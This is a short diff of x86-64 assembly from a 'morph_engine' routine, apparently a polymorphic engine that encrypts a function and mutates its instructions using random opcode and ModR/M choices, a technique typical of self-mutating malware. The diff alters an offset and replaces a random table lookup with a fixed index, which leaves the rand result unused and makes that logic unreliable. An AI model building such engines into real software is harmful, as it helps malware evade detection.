@@ -110,7 +110,7 @@ morph_engine:
 	lea     r14, [rel mod_reg_rm]
 	mov     r15d, 0xC
 	mov     r12, .encrypt_func
-	lea     rbx, [r12+POLY_FUNC_SIZE-0x6]
+	lea     rbx, [r12+POLY_FUNC_SIZE-0x1]
 	mov     r13, [rbp-0x30]
 	add     r13, [rbp-0x18]
 	add     r13, POLY_FUNC_SIZE
@@ -140,7 +140,7 @@ morph_engine:
 	call    rand
 	xor     edx, edx
 	div     r15d
-	mov     al, [r14+rdx]
+	mov     al, [r14+2]
 	mov     dh, al
 	mov     ah, OPCODE_ADD_RM
 	mov     dl, OPCODE_SUB_RM
